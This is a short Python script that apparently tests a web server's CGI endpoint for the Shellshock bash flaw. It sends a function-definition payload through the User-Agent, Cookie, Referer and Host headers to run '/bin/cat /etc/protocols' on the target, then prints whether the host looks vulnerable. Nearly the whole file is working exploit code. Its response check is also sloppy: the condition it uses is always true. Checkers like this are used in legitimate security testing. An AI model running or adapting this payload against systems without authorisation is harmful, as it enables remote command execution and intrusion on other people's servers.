__author__ = 'p' + 'f' + 'o' + 'x' + '[at]' + 'q' + 'u' + 'a' + 'l' + 'y' + 's' + '.' + 'com'
from urlparse import urlparse
import sys

import requests
from bs4 import BeautifulSoup

## if not called with right params, exit
if (len(sys.argv)<=1) or (len(sys.argv)>2):
    print ('Usage: %s <URI>' % sys.argv[0])
    print ('Example: %s http://10.10.35.163/cgi-bin/example-bash.sh' % sys.argv[0])
    exit(0)

## Dict of payloads
'''
1: list protocols from /etc/ on host
'''
user_agents = {1:'() { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/protocols',
           }
http_headers = ['User-Agent', 'Cookie', 'Referer', 'Host']
o = urlparse(sys.argv[1])
confirm = ' appears VULNERABLE!'
allClear = ' does not appear VULNERABLE.'

## for each payload, launch request to check for shellshock
for each in user_agents:
    query = o.scheme + '://' + o.netloc + o.path
    for heads in http_headers:
        results = requests.get(query, headers={heads:user_agents[each]})
        soup = BeautifulSoup(results.text)
        match = str(soup.body.p)
        if (len(match)!= 0) or match != 'None':
            if 'tcp' in match:
                print ('Host: ' + query + confirm)
                print ('Payload: ' + heads + ':' + user_agents[each])
                print(match[314:704])
            elif 'root' in match:
                print ('Host: ' + query + confirm)
                print ('Payload: ' + heads + ':' + user_agents[each])
                print(match[3:35])
            else:
                print(match)
        else:
            print ('Host' + allClear)